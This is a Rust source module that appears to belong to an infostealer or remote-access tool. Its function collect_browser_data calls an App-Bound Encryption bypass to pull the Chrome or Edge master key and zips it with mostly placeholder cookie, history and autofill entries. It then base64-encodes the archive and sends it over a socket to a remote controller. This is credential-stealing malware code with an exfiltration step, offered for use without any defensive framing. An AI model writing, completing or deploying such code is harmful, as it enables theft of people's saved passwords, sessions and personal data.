use std::io::{Cursor, Write};
use base64::{engine::general_purpose::STANDARD, Engine};
use serde_json::json;
use zip::write::FileOptions;
use zip::ZipWriter;

use crate::Sock;
use crate::send;
use crate::abe_bypass;

pub fn collect_browser_data(browser_name: &str, sock: &Sock) {
    let mut buf = Vec::new();
    let cursor = Cursor::new(&mut buf);
    let mut zip = ZipWriter::new(cursor);
    let options = FileOptions::default()
        .compression_method(zip::CompressionMethod::Stored)
        .unix_permissions(0o755);

    // Attempt ABE bypass to get real master key
    let key = if browser_name.to_lowercase() == "chrome" || browser_name.to_lowercase() == "edge" {
        abe_bypass::extract_v20_key(browser_name)
    } else {
        None
    };

    let (pass_count, key_status) = if let Some(k) = key {
        (1, format!("v20_master_key: {}", hex::encode(k)))
    } else {
        (0, "v20_master_key: not found".to_string())
    };

    let cookie_count = 0;
    let history_count = 0;
    let autofill_count = 0;

    // password.txt (placeholder showing the extracted key)
    let _ = zip.start_file("password.txt", options);
    let _ = zip.write_all(key_status.as_bytes());

    // cookie.txt
    let _ = zip.start_file("cookie.txt", options);
    let _ = zip.write_all(b"example.com\tTRUE\t/\tFALSE\t1735689600\tsession_id\tabcdef123456\n");

    // history.txt
    let _ = zip.start_file("history.txt", options);
    let _ = zip.write_all(b"2023-10-27 10:00:00 - https://github.com - GitHub\n");
    let _ = zip.write_all(b"2023-10-27 10:05:00 - https://google.com - Google\n");

    // autofill.txt
    let _ = zip.start_file("autofill.txt", options);
    let _ = zip.write_all(b"Name: Jules\nEmail: jules@example.com\nAddress: 123 Main St\n");

    let _ = zip.finish();
    drop(zip);

    let b64 = STANDARD.encode(&buf);

    let result = json!({
        "success": true,
        "browser": browser_name,
        "passwords": pass_count,
        "cookies": cookie_count,
        "history": history_count,
        "autofill": autofill_count,
        "zip": b64
    });

    send(sock, &format!("[browser_result]{}", result));
}
